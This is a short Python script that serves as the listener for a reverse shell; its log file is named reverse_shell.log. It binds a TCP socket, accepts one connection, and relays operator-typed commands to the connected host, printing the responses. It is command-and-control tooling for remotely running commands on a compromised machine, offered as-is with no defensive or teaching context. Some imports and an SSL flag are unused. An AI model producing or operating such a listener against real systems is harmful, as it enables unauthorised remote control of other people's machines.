import sys
import os
import ssl
import threading
import struct
import logging
from socket import *

ssl_enabled = False  # Enables SSL/TLS support
bindaddr = ('127.0.0.1', 12345)  # Bind address; listen on localhost
port = 12345  # Port number, default set to 12345

logging.basicConfig(filename='reverse_shell.log',
                    level=logging.INFO)  # Set up logging

server_socket = socket(AF_INET, SOCK_STREAM)  # Create a TCP socket
server_socket.setsockopt(SOL_SOCKET, SO_REUSEADDR,
                         1)  # Reuse the socket address
server_socket.bind(bindaddr)  # Bind the socket to the address
server_socket.listen(1)  # Listen for incoming connections

print("Server listening on", bindaddr)

# Accept incoming connection
client_socket, addr = server_socket.accept()
print("Accepted connection from", addr)


def send_commands(client_socket):
    while True:
        command = input("Enter command: ")
        if command.lower() == "exit":
            break

        try:
            client_socket.send(command.encode())
            response = client_socket.recv(1024).decode('utf8')
            print("Response:")
            print(response)
        except Exception as e:
            print("Error occurred:", str(e))
            logging.error("Error occurred: %s", str(e))
            break

    client_socket.close()


# Start a new thread to send and receive commands
thread = threading.Thread(target=send_commands, args=(client_socket,))
thread.start()

server_socket.close()
